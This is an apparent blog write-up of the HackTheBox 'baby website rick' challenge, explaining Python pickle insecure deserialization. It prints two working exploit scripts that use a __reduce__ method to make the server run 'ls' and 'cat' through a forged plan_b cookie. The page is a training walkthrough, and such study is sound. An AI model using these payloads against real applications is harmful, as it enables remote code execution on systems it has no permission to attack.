I".Ü<style>
.time {
    text-align: center;
    margin-top: 30px;
    font-family: 'Open Sans', sans-serif;
    font-weight: 300;
    font-style: normal;
}
</style>

<p class="time">01 Sep 2021 | Reading time: ~5 min</p>

<h1 align="center">Pickle Insecure Deserialization</h1>
<h2 align="center">baby website rick - HackTheBox</h2>

<p class="time" style="font-size: 75%;">

#HackTheBox

#Challenge

#Easy

#Web

#insecure-deserialization

#pickle

#python

</p>

<p><img src="/assets/images/Screenshots/baby website rick/thumbnail.png" alt="thumbnail.png" /></p>

<hr />

<h2 class="no_toc text-delta" id="table-of-contents">Table of contents</h2>

<ol id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a>    <ol>
      <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills</a></li>
    </ol>
  </li>
  <li><a href="#video" id="markdown-toc-video">Video</a></li>
  <li><a href="#writeup-tldr" id="markdown-toc-writeup-tldr">Writeup [TL;DR]</a>    <ol>
      <li><a href="#information-gathering" id="markdown-toc-information-gathering">Information Gathering</a></li>
      <li><a href="#the-bug" id="markdown-toc-the-bug">The Bug</a></li>
      <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a></li>
    </ol>
  </li>
</ol>
<hr />

<h2 id="introduction">Introduction</h2>
<p>Walkthrough for the <strong>baby website rick</strong> web challenge from <strong>HackTheBox</strong>. <br /></p>

<h3 id="improved-skills">Improved skills</h3>
<ul>
  <li>How <strong>serialization</strong> and <strong>deserialization</strong> work</li>
  <li>How to exploit <strong>insecure deserialization vulnerabilities</strong> when using <strong>python pickle</strong>.</li>
</ul>

<h2 id="video">Video</h2>
<iframe width="736" height="491" src="https://www.youtube.com/embed/TPAhM6W2Zaw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<h2 id="writeup-tldr">Writeup [TL;DR]</h2>
<blockquote>
  <p>Look Morty, look! I turned myself into a website Morty, I‚Äôm Website Rick babyyy!! But don‚Äôt play around with some of them anti pickle serum I have stored somewhere safe, if I turn back to a human I‚Äôll have to go to family therapy and we don‚Äôt want that Morty.</p>
</blockquote>

<h3 id="information-gathering">Information Gathering</h3>

<p>Running the instance of the challenge it is possible to browse to the Website Rick home page, where it is possible to read:</p>

<p><img src="/assets/images/Screenshots/baby website rick/baby website rick 1.png" alt="Pasted image 20210825220213.png" />
<em>Don‚Äôt play around with this serum morty!!</em> and then the info <code class="language-plaintext highlighter-rouge">&lt;__main__.anti_pickle_serum object at 0x7f88f526cf90&gt;</code></p>

<p>As also suggested by the title of the page, this challenge focuses on an <strong>insecure deserialization vulnerability</strong>.</p>

<p>Intercepting with Burpsuite the request sent to the server, it is possible to notice that the client sends a strange cookie, called <code class="language-plaintext highlighter-rouge">plan_b</code>. Decoding the cookie I can read some weird instruction like <code class="language-plaintext highlighter-rouge">__main__</code> or <code class="language-plaintext highlighter-rouge">__builtin__ object</code> that suggest me something related to <strong>python</strong>, as also confirmed by the Server Fingerprint. 
<img src="/assets/images/Screenshots/baby website rick/baby website rick 2.png" alt="Pasted image 20210825220530.png" /></p>

<p>At the moment I can already assume that playing around with the cookie probably will lead to some kind of code execution or file inclusion, however I don‚Äôt know yet in what way.</p>

<p>Because the word <strong>pickle</strong> appears multiple times, I started documenting about what it is, discovering that pickle is a <strong>Python module used to serialize and deserialize objects</strong>. As also said within the official documentation, <strong>pickle is not secure</strong>. It is possible to <em>construct malicious pickle data which will <strong>execute arbitrary code during unpickling</strong></em>. Ok, so <code class="language-plaintext highlighter-rouge">plan_b</code> is a cookie used to pass pickled serialized data to the server.</p>

<p><img src="/assets/images/Screenshots/baby website rick/baby website rick 3.png" alt="Pasted image 20210825220803.png" /></p>

<p>From what I just read from the documentation it is possible to send a malicious cookie in order to force the server to deserialize it and execute arbitrary code. But in which way?</p>

<p>The documentation shows different methods that can be used to manage pickle data, as well as another module, called <strong>pickletools</strong>, that can be used to <em>disassemble pickled object</em>. In order to better understand what is passed to the server, I wrote a small python script that decompile and optimize the <code class="language-plaintext highlighter-rouge">plan_b</code> cookie. The decompiled pickle is not very helpful, however it allows to understand that the server is expecting an <code class="language-plaintext highlighter-rouge">anti_pickle_serum</code> class object (as also suggested by the home page).</p>

<p><img src="/assets/images/Screenshots/baby website rick/baby website rick 4.png" alt="Pasted image 20210826161236.png" /></p>

<p>Ok, I‚Äôve no idea on what to do next, so let‚Äôs search online for any good article explaining this pickle vulnerability.</p>

<h3 id="the-bug">The Bug</h3>
<p>One of the first results is this blog post from David‚Äôs personal site <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> where it explains <strong>how to exploit a pickle deserialization vulnerability</strong> using the <code class="language-plaintext highlighter-rouge">__reduce__()</code> function.</p>

<p>The <code class="language-plaintext highlighter-rouge">__reduce__()</code> method takes no argument and shall return either a string or a tuple. The semantics of each item are in order:</p>
<ul>
  <li>A <strong>callable object</strong> that will be called to create the initial version of the object.</li>
  <li>A <strong>tuple of arguments</strong> for the callable object. An empty tuple must be given if the callable does not accept any argument.</li>
</ul>

<p>So by implementing <code class="language-plaintext highlighter-rouge">__reduce__()</code> in a class, I can give the pickling process a callable and some other arguments to run. Potentially I can execute <code class="language-plaintext highlighter-rouge">os.system()</code> and some commands, as also shown by the David‚Äôs PoC.</p>

<p>Based on its code I wrote a test exploit which implement the <code class="language-plaintext highlighter-rouge">__reduce__()</code> method and execute <code class="language-plaintext highlighter-rouge">ls</code>. I gave to the class the same name used by the original pickle and I generated the serialized string.</p>

<p>Mmm‚Ä¶ Looking at the decompiled code it seems <strong>too different from the previous one</strong>, however let‚Äôs see if the exploit work. Let me copy the string and paste it within the <code class="language-plaintext highlighter-rouge">plan_b</code> cookie‚Ä¶ Crap, Internal Server Error. Probably the two objects differs too much.</p>

<p>After some trial and error I figured out how to generate almost the same serialized object. The script simply defines a void constructor and then generates the corresponding pickle. The two however are still different.</p>

<p><img src="/assets/images/Screenshots/baby website rick/baby website rick 5.png" alt="Pasted image 20210826175503.png" /></p>

<h3 id="exploitation">Exploitation</h3>
<p>Looking at the meaning of the decompiled <code class="language-plaintext highlighter-rouge">SETITEM</code> opcode I found out that it add a pair of Key-Value to an existing dictionary, meaning that my custom object must be pickled inside a dictionary in order to be equal the original one. Good! The two object are now the same, I have successfully reversed the original pickle and I‚Äôm able to generate valid serialized objects. Let‚Äôs try to implement the <code class="language-plaintext highlighter-rouge">__reduce__()</code> method within this class and see if it works now that the result is the same of the original.</p>

<p>It works! Although it didn‚Äôt show the result of the executed command, the server did not throw an Internal Server Error, instead it printed a ‚Äú0‚Äù which is the value returned by the command.</p>

<p><img src="/assets/images/Screenshots/baby website rick/baby website rick 6.png" alt="Pasted image 20210826175812.png" /></p>

<p>As said by this user on StackExchange <em>‚Äú<code class="language-plaintext highlighter-rouge">os.system()</code> just run the process, it doesn‚Äôt capture the output‚Äù</em>. In order to obtain the output of the command it is necessary to <strong>use a different function</strong>, like <code class="language-plaintext highlighter-rouge">subprocess.check_output()</code></p>

<p>Ok, let‚Äôs implement the new function.</p>

<p>Damn, it is better if I re-read the documentation‚Ä¶ Right, I must return a tuple containing the function to call and a tuple of arguments. Maybe we are done.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">class</span> <span class="nc">anti_pickle_serum</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'ls'</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>

<span class="n">exploit_obj</span> <span class="o">=</span> <span class="n">anti_pickle_serum</span><span class="p">()</span>
<span class="n">raw_pickle</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"serum"</span> <span class="p">:</span> <span class="n">exploit_obj</span><span class="p">},</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>

<span class="n">optimed_pickle</span> <span class="o">=</span> <span class="n">pickletools</span><span class="p">.</span><span class="n">optimize</span><span class="p">(</span><span class="n">raw_pickle</span><span class="p">)</span>
<span class="n">pickletools</span><span class="p">.</span><span class="n">dis</span><span class="p">(</span><span class="n">optimed_pickle</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">raw_pickle</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>Wait, this should be correct! Maybe python3 and python2 behave differently when generating the serialized object? The server uses python2 so let‚Äôs try with that version.</p>

<p>Here we go! I have successfully executed the <code class="language-plaintext highlighter-rouge">ls</code> command. Now let‚Äôs update the script and obtain the flag!</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">class</span> <span class="nc">anti_pickle_serum</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cat'</span><span class="p">,</span> <span class="s">'flag_wIp1b'</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>

<span class="n">exploit_obj</span> <span class="o">=</span> <span class="n">anti_pickle_serum</span><span class="p">()</span>
<span class="n">raw_pickle</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"serum"</span> <span class="p">:</span> <span class="n">exploit_obj</span><span class="p">},</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>

<span class="n">optimed_pickle</span> <span class="o">=</span> <span class="n">pickletools</span><span class="p">.</span><span class="n">optimize</span><span class="p">(</span><span class="n">raw_pickle</span><span class="p">)</span>
<span class="n">pickletools</span><span class="p">.</span><span class="n">dis</span><span class="p">(</span><span class="n">optimed_pickle</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">raw_pickle</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<hr />

<style>
.share {
  display: block;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
}
</style>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs>
    <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol>
    <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol>
    <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol>
    <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol>
    <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol>
    <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol>
    <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol>
    <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol>
    <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol>
    <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol>
    <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol>
    <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562
		C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563
		h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243
		C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982
		c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379
		c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379
		C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416
		c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575
		H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685
		c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38
		c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99
		c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522
		c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854
		c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol>
    <symbol id="icon-telegram" viewBox="0 0 80 80">
    <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" />
     </symbol>
     <symbol id="icon-youtube" viewBox="0 0 24 24">
